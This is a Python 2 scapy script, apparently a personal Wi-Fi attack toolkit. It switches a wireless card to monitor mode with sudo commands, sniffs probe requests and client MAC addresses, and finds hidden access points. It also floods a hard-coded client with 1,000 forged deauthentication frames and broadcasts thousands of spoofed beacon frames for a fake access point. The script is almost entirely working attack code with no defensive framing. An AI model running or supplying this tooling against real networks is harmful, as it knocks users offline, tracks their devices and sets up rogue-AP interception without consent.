import sys
import os
from scapy.all import *
import threading
from multiprocessing import Process

interface= "wlx00c0ca84aba2"
ap_mac = "FC:52:8D:77:B8:A9"
device_mac = "40:4e:36:d2:eb:b2"
macAddresses = []
probeReqs = []
hidden_aps = []
aps = []

def sniff_probe_requests(pkt):
	

	if pkt.haslayer(Dot11ProbeReq):
		netName = pkt.getlayer(Dot11ProbeReq).info
		if netName not in probeReqs:
			probeReqs.append(netName)
			print "[+] Detected new probe request: " + netName

def sniff_all_mac_addresses(pkt):
	

	if pkt.haslayer(Dot11):
		layer = pkt.getlayer(Dot11)
		if layer.addr2 and (layer.addr2 not in macAddresses) and layer.addr1 == ap_mac:
			macAddresses.append(layer.addr2)
			print "[+] Detected new mac address: " + layer.addr2

def find_hidden_ap(pkt):
	
	if pkt.haslayer(Dot11ProbeResp):
		addr2 = pkt.getlayer(Dot11).addr2
		if (addr2 in hidden_aps) and (addr2 not in aps):
			name = pkt.getlayer(Dot11ProbeResp).info
			print '[+] ' + name + ' ' + addr2
			aps.append(addr2)
	if pkt.haslayer(Dot11Beacon):
		if pkt.getlayer(Dot11).info == '':
			addr2 = pkt.getlayer(Dot11).addr2
			if addr2 not in hidden_aps:
				hidden_aps.append(addr2)

def sniff_ap_traffic(pkt):
	if pkt.haslayer(Dot11):
		layer = pkt.getlayer(Dot11)
		if layer.addr1 == "00:c0:ca:84:ab:a2":
			print "[+] " + layer.addr1



def get_probe_requests():
    print "getting probe requests.."
    sniff(iface=interface, prn=sniff_probe_requests)


def get_all_mac_addresses():
	print "getting all mac addresses on network.."
	sniff(iface=interface, prn=sniff_all_mac_addresses)

def deauth_device():
	print "deauthing.."
	pkt = RadioTap() / Dot11( addr1=ap_mac, addr2=device_mac, addr3=device_mac) / Dot11Deauth() 
	sendp(pkt, iface=interface, count=1000, inter=.1)


def find_all_hidden_aps():
	print "finding hidden ap's.."
	sniff(iface=interface, prn=find_hidden_ap)

def sniff_ap():
	print "AP Sniffing.."
	sniff(iface=interface, prn=find_hidden_ap)

def create_ap():
	print "Starting AP"
	pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2='00:c0:ca:84:ab:a2', addr3='00:c0:ca:84:ab:a2') / Dot11Beacon(cap=0x1100) / Dot11Elt(ID=0, info="YO") / Dot11Elt(ID=1, info ="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
	sendp(pkt, iface=interface, count = 10000, inter=.1)
	


def setup_nic():
	os.system('sudo ifconfig ' + interface + ' down')
	os.system('sudo iwconfig ' + interface + ' mode monitor')
	os.system('sudo ifconfig ' + interface + ' up')

def main():
	if sys.argv[1] == '-d':
		deauth_device()
	elif sys.argv[1] == '-g':
		get_all_mac_addresses()
	elif sys.argv[1] == '-p':
		get_probe_requests()
	elif sys.argv[1] == '-s':
		setup_nic()
	elif sys.argv[1] == '-h':
		find_all_hidden_aps()
	elif sys.argv[1] == '-ap':
		
		t1 = threading.Thread( target=create_ap, args=() )
		t1.setDaemon = True
		t1.name = "Thread_1"
		t1.start()

		t2 = threading.Thread( target=sniff_ap, args=() )
		t2.setDaemon = True
		t2.name = "Thread_2"
		t2.start()
		

if __name__ == "__main__":
    main()